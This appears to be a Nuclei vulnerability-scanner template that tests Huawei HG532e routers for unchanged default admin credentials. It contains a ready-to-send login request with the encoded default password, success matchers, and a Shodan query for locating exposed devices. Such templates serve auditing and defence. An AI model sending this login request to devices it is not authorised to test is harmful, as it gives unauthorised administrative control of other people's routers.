id: huawei-HG532e-default-login

info:
  name: Huawei HG532e 默认凭据（弱口令）
  author: pussycat0x
  severity: high
  description: 该模板通过尝试 Huawei HG532e 的默认管理员账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:h:huawei:hg532e:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    shodan-query: http.html:"HG532e"
    product: hg532e
    vendor: huawei
  tags: default-login,huawei,vuln

http:
  - raw:
      - |
        POST /index/login.cgi HTTP/1.1
        Host: {{Hostname}}
        Cookie: Language=en; FirstMenu=Admin_0; SecondMenu=Admin_0_0; ThirdMenu=Admin_0_0_0
        Content-Type: application/x-www-form-urlencoded

        Username=user&Password=MDRmODk5NmRhNzYzYjdhOTY5YjEwMjhlZTMwMDc1NjllYWYzYTYzNTQ4NmRkYWIyMTFkNTEyYzg1YjlkZjhmYg%3D%3D

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - 'Set-Cookie: SessionID'

      - type: word
        part: body
        words:
          - "<title>replace</title>"

      - type: status
        status:
          - 200
